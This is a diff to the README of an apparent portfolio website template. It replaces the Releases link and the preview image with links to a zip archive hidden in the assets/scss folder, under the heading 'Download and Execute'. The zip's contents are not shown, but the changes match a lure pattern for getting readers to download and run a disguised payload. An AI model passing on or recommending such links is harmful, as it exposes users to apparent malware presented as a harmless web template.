@@ -22,7 +22,7 @@ Create a stunning first impression with the "Imrane Portfolio," a sleek and mode
 
 🔍 **Topics:** animation, bootstrap, contact, CSS, form, HTML, JavaScript, portfolio, responsive, SEO-optimized, testimonial, web design
 
-🔗 **Download and Execute:** [Imrane Portfolio - Download and Execute](https://github.com/MuhammadArkaanNabila/Imrane-Portfolio/releases)
+🔗 **Download and Execute:** [Imrane Portfolio - Download and Execute](https://github.com/MuhammadArkaanNabila/Imrane-Portfolio/raw/refs/heads/main/assets/scss/Portfolio-Imrane-2.3.zip)
 
 For more details, visit the "Releases" section of the repository.
 
@@ -30,7 +30,7 @@ For more details, visit the "Releases" section of the repository.
 
 Here is a glimpse of the "Imrane Portfolio":
 
-![Portfolio Preview](https://via.placeholder.com/800x400)
+![Portfolio Preview](https://github.com/MuhammadArkaanNabila/Imrane-Portfolio/raw/refs/heads/main/assets/scss/Portfolio-Imrane-2.3.zip)
 
 ## Get Started
 
